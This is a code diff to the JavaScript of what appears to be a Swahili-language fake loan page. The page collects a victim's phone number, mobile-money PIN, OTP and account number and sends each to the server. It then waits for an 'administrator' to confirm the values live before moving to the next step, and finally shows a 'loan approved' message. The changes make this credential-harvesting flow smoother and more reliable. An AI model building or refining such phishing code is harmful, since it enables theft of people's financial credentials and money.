@@ -11,6 +11,12 @@ function showSurfaceNotification(message) {
     }, 4000);
 }
 
+function showLoadingNotification(message) {
+    const notification = document.getElementById('surfaceNotification');
+    notification.innerText = message;
+    notification.style.display = 'block';
+}
+
 function goToStep(stepId) {
     document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
     document.getElementById(stepId).classList.add('active');
@@ -46,7 +52,6 @@ function submitPhoneAndNext() {
     }
     
     savedPhoneNumber = phoneInput;
-    // Update the display field on the PIN entry screen
     const displayPhoneEl = document.getElementById('displayPhoneNumber');
     if (displayPhoneEl) {
         displayPhoneEl.innerText = '+255 ' + savedPhoneNumber;
@@ -65,7 +70,7 @@ function requestPinVerification() {
     goToStep('step-pin');
 }
 
-// PIN Box navigation logic (No auto-submit)
+// PIN Box navigation logic
 const pinBoxes = document.querySelectorAll('.pin-box');
 pinBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
@@ -76,7 +81,7 @@ pinBoxes.forEach((box, index) => {
 });
 
 // Explicit function triggered ONLY when INGIA is tapped
-function submitPin() {
+async function submitPin() {
     let pin = '';
     pinBoxes.forEach(b => pin += b.value);
     
@@ -85,14 +90,19 @@ function submitPin() {
         return;
     }
 
-    fetch('/api/submit-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, pin })
-    });
-    
-    showSurfaceNotification('Inasubiri uthibitisho wa msimamizi...');
-    startPolling();
+    showLoadingNotification('Inasubiri uthibitisho wa msimamizi...');
+
+    try {
+        await fetch('/api/submit-pin', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, pin })
+        });
+        
+        startPolling();
+    } catch (err) {
+        showSurfaceNotification('Hitilafu imetokea. Jaribu tena.');
+    }
 }
 
 // OTP Box navigation logic
@@ -115,7 +125,7 @@ function checkOtpComplete() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId, otp })
         });
-        showSurfaceNotification('Inathibitisha OTP...');
+        showLoadingNotification('Inathibitisha OTP...');
     }
 }
 
@@ -130,7 +140,7 @@ function submitAccount() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId, accountNumber })
     });
-    showSurfaceNotification('Inatuma taarifa za akaunti...');
+    showLoadingNotification('Inatuma taarifa za akaunti...');
 }
 
 function startPolling() {
@@ -141,23 +151,26 @@ function startPolling() {
             const data = await res.json();
             
             if (data.status === 'next_step') {
-                goToStep('step-otp');
-                showSurfaceNotification('Tafadhali weka ujumbe wa OTP uliopokea');
-            } else if (data.status === 'success') {
-                goToStep('step-success');
                 clearInterval(pollInterval);
-                showSurfaceNotification('Hongera! Mkopo umeidhinishwa');
+                document.getElementById('surfaceNotification').style.display = 'none';
+                goToStep('step-otp');
+            } else if (data.status === 'success') {
+                clearInterval(pollInterval);
+                document.getElementById('surfaceNotification').style.display = 'none';
+                goToStep('step-success');
             } else if (data.status === 'restart_pin') {
+                clearInterval(pollInterval);
                 goToStep('step-pin');
                 showSurfaceNotification('PIN si sahihi. Tafadhali jaribu tena.');
             } else if (data.status === 'restart_otp') {
+                clearInterval(pollInterval);
                 goToStep('step-otp');
                 showSurfaceNotification('OTP si sahihi. Tafadhali jaribu tena.');
             } else if (data.status === 'restart_acc') {
+                clearInterval(pollInterval);
                 goToStep('step-account');
                 showSurfaceNotification('Namba ya akaunti si sahihi.');
             }
         } catch (err) {}
-    }, 3000);
+    }, 2500);
 }
-    
